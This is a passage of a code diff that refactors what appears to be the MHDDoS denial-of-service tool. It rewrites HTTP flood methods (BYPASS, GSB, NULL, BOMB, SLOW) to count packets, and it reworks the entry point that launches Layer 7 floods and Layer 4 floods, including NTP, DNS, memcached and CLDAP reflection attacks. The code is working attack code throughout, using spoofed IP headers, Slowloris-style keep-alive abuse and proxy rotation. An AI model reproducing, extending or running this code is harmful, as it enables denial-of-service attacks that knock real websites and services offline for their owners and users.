         Tools.safe_close(s)
+        return packets
 
-    def BYPASS(self):
+    def BYPASS(self) -> int:
         pro = None
         if self._proxies:
             pro = randchoice(self._proxies)
-        s = None
+        s, packets = None, 0
         with suppress(Exception), Session() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
+                if not self._event.is_set(): return 0
                 if pro:
                     with s.get(self._target.human_repr(),
                                proxies=pro.asRequest()) as res:
-                        self.REQUESTS_SENT += 1
-                        self.BYTES_SEND += Tools.sizeOfRequest(res)
+                        self._stats.track(1, Tools.sizeOfRequest(res))
+                        packets += 1
                         continue
 
                 with s.get(self._target.human_repr()) as res:
-                    self.REQUESTS_SENT += 1
-                    self.BYTES_SEND += Tools.sizeOfRequest(res)
+                    self._stats.track(1, Tools.sizeOfRequest(res))
+                    packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def GSB(self):
-        payload = str.encode("%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
-                                                           self._target.raw_path_qs,
-                                                           ProxyTools.Random.rand_str(6)) +
-                             "Host: %s\r\n" % self._target.authority +
-                             self.randHeadercontent +
-                             'Accept-Encoding: gzip, deflate, br\r\n'
-                             'Accept-Language: en-US,en;q=0.9\r\n'
-                             'Cache-Control: max-age=0\r\n'
-                             'Connection: Keep-Alive\r\n'
-                             'Sec-Fetch-Dest: document\r\n'
-                             'Sec-Fetch-Mode: navigate\r\n'
-                             'Sec-Fetch-Site: none\r\n'
-                             'Sec-Fetch-User: ?1\r\n'
-                             'Sec-Gpc: 1\r\n'
-                             'Pragma: no-cache\r\n'
-                             'Upgrade-Insecure-Requests: 1\r\n\r\n')
-        s = None
+    def GSB(self) -> int:
+        payload = str.encode(
+            "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type,
+                                          self._target.raw_path_qs,
+                                          ProxyTools.Random.rand_str(6)) +
+            "Host: %s\r\n" % self._target.authority +
+            self.randHeadercontent +
+            'Accept-Encoding: gzip, deflate, br\r\n'
+            'Accept-Language: en-US,en;q=0.9\r\n'
+            'Cache-Control: max-age=0\r\n'
+            'Connection: Keep-Alive\r\n'
+            'Sec-Fetch-Dest: document\r\n'
+            'Sec-Fetch-Mode: navigate\r\n'
+            'Sec-Fetch-Site: none\r\n'
+            'Sec-Fetch-User: ?1\r\n'
+            'Sec-Gpc: 1\r\n'
+            'Pragma: no-cache\r\n'
+            'Upgrade-Insecure-Requests: 1\r\n\r\n'
+        )
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def NULL(self) -> None:
-        payload: Any = str.encode(self._payload +
-                                          "Host: %s\r\n" % self._target.authority +
-                                          "User-Agent: null\r\n" +
-                                          "Referrer: null\r\n" +
-                                          self.SpoofIP + "\r\n")
-        s = None
+    def NULL(self) -> int:
+        payload: bytes = str.encode(
+            self._payload +
+            "Host: %s\r\n" % self._target.authority +
+            "User-Agent: null\r\n" +
+            "Referrer: null\r\n" +
+            self.SpoofIP + "\r\n"
+        )
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
         Tools.safe_close(s)
+        return packets
 
-    def BOMB(self):
+    def BOMB(self) -> int:
         assert self._proxies, \
             'This method requires proxies. ' \
             'Without proxies you can use github.com/codesenberg/bombardier'
@@ -976,24 +865,26 @@ class HttpFlood:
             ],
             stdout=PIPE,
         )
-        if self._thread_id == 0:
-            print(proxy, res.stdout.decode(), sep='\n')
+        return 1
 
-    def SLOW(self):
+    def SLOW(self) -> int:
         payload: bytes = self.generate_payload()
-        s = None
+        s, packets = None, 0
         with suppress(Exception), self.open_connection() as s:
             for _ in range(self._rpc):
-                if not self._event.is_set(): return
-                Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND)
-            while Tools.send(s, payload, self.REQUESTS_SENT, self.BYTES_SEND) and s.recv(1):
+                if not self._event.is_set(): return 0
+                Tools.send(s, payload, self._stats)
+                packets += 1
+            while Tools.send(s, payload, self._stats) and s.recv(1):
                 for i in range(self._rpc):
-                    if not self._event.is_set(): return
+                    if not self._event.is_set(): return 0
                     keep = str.encode("X-a: %d\r\n" % ProxyTools.Random.rand_int(1, 5000))
-                    Tools.send(s, keep, self.REQUESTS_SENT, self.BYTES_SEND)
+                    Tools.send(s, keep, self._stats)
+                    packets += 1
                     sleep(self._rpc / 15)
                     break
         Tools.safe_close(s)
+        return packets
 
     def select(self, name: str) -> None:
         self.SENT_FLOOD = self.GET
@@ -1032,52 +923,37 @@ class HttpFlood:
         if name == "PPS":
             self.SENT_FLOOD = self.PPS
             self._defaultpayload = (
-                    self._defaultpayload +
-                    "Host: %s\r\n\r\n" % self._target.authority).encode()
+                self._defaultpayload +
+                "Host: %s\r\n\r\n" % self._target.authority
+            ).encode()
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
         if name == "DOWNLOADER": self.SENT_FLOOD = self.DOWNLOADER
         if name == "BOMB": self.SENT_FLOOD = self.BOMB
-        if name == "KILLER": self.SENT_FLOOD = self.KILLER
 
 
-def main(url, ip, method, threads, event, thread_pool, proxies, rpc=None, refl_li_fn=None, statistics=None):
-    REQUESTS_SENT = statistics['requests']
-    BYTES_SEND = statistics['bytes']
-
+def main(url, ip, method, event, proxies, stats, rpc=None, refl_li_fn=None):
     if method not in Methods.ALL_METHODS:
-        exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
+        exit(f"Method {method} Not Found")
 
-    threads = Tools.prepare(url.host, threads, thread_pool, REQUESTS_SENT, BYTES_SEND)
+    (url, ip), proxies = Tools.parse_params(url, ip, proxies)
     if method in Methods.LAYER7_METHODS:
-        useragent_li = ROOT_DIR / "files/useragent.txt"
         bombardier_path = Path.home() / "go/bin/bombardier"
 
         if method == "BOMB":
             assert (
-                    bombardier_path.exists()
-                    or bombardier_path.with_suffix('.exe').exists()
+                bombardier_path.exists()
+                or bombardier_path.with_suffix('.exe').exists()
             ), (
                 "Install bombardier: "
                 "https://github.com/MHProDev/MHDDoS/wiki/BOMB-method"
             )
 
-        if not useragent_li.exists():
-            exit("The Useragent file doesn't exist ")
-
-        with useragent_li.open("r+") as f:
-            uagents = set(a.strip() for a in f.readlines())
-        referers = set(a.strip() for a in REFERERS)
-
-        if not uagents:
+        if not USERAGENTS:
             exit("Empty Useragent File ")
-        if not referers:
+        if not REFERERS:
             exit("Empty Referer File ")
 
-        for thread_id in range(threads):
-            thread_pool.submit(
-                HttpFlood(thread_id, url, ip, method, rpc, event,
-                          uagents, referers, proxies, REQUESTS_SENT, BYTES_SEND).run
-            )
+        return HttpFlood(url, ip, method, rpc, event, USERAGENTS, REFERERS, proxies, stats)
 
     if method in Methods.LAYER4_METHODS:
         port = url.port
@@ -1091,6 +967,8 @@ def main(url, ip, method, threads, event, thread_pool, proxies, rpc=None, refl_l
 
         ref = None
         if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "CLDAP", "ARD"}:
+            # TODO: rework this code when amplifier attack is planned
+            # (not used as of now)
             refl_li = ROOT_DIR / "files" / refl_li_fn
             if not refl_li.exists():
                 exit("The reflector file doesn't exist")
@@ -1102,8 +980,4 @@ def main(url, ip, method, threads, event, thread_pool, proxies, rpc=None, refl_l
             if not ref:
                 exit("Empty Reflector File ")
 
-        for _ in range(threads):
-            thread_pool.submit(
-                Layer4((ip, port), ref, method, event,
-                       proxies, REQUESTS_SENT, BYTES_SEND).run
-            )
+        return Layer4((ip, port), ref, method, event, proxies, stats)
